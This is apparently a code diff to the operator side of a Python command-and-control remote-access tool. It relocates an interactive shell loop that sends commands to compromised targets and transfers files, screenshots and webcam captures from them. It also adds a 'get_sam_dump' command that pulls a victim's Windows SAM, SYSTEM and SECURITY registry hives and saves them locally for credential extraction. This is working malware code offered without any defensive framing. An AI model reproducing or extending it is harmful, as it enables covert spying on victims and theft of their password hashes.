@@ -280,36 +280,7 @@ def c2_help_manual():
     \n''')
 
 
-def target_communication(target, ip):
-    screenshot_count = 0
-    webcam_count = 0
 
-    while True:
-        command = input('* Shell~%s: ' % str(ip))
-        reliable_send(target, command)
-        if command == 'quit':
-            break
-        elif command == 'background' or command == 'bg':
-            break
-        elif command == 'clear':
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            pass
-        elif command[:6] == 'upload':
-            upload_file(target, command[7:])
-        elif command[:8] == 'download':
-            download_file(target, command[9:])
-        elif command[:10] == 'screenshot':
-            screenshot(target, screenshot_count)
-            screenshot_count += 1
-        elif command[:6] == 'webcam':
-            webcam(target, webcam_count)
-            webcam_count += 1
-        elif command == 'help':
-            server_help_manual()
-        else:
-            result = reliable_recv(target)
-            print(result)
 
 
 def accept_connections():
@@ -444,6 +415,20 @@ def handle_session_command(targets, ips, command):
         print('[-] No Session Under That ID Number. Error: ', e)
 
 
+def handle_sam_dump(target, command):
+    reliable_send(target, command)
+    sam_data, system_data, security_data = reliable_recv(target)
+    if isinstance(sam_data, str):  # An error message was returned
+        print(sam_data)
+    else:  # The file data was returned
+        with open('SAM_dump', 'wb') as f:
+            f.write(sam_data)
+        with open('SYSTEM_dump', 'wb') as f:
+            f.write(system_data)
+        with open('SECURITY_dump', 'wb') as f:
+            f.write(security_data)
+
+
 def exit_all(targets, sock, t1):
     """
     Exits all connections with targets, closes the socket, and stops the thread.
@@ -550,6 +535,40 @@ def exit_c2_server(sock, t1):
     close_socket(sock)
     join_thread(t1)
     print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
+
+
+def target_communication(target, ip):
+    screenshot_count = 0
+    webcam_count = 0
+
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(target, command)
+        if command == 'quit':
+            break
+        elif command == 'background' or command == 'bg':
+            break
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            pass
+        elif command[:6] == 'upload':
+            upload_file(target, command[7:])
+        elif command[:8] == 'download':
+            download_file(target, command[9:])
+        elif command[:10] == 'screenshot':
+            screenshot(target, screenshot_count)
+            screenshot_count += 1
+        elif command[:6] == 'webcam':
+            webcam(target, webcam_count)
+            webcam_count += 1
+        elif command[:12] == 'get_sam_dump':
+            handle_sam_dump(target, command)
+        elif command == 'help':
+            server_help_manual()
+        else:
+            result = reliable_recv(target)
+            print(result)
 
 
 def run_c2_server(targets, ips, sock, t1, start_flag):
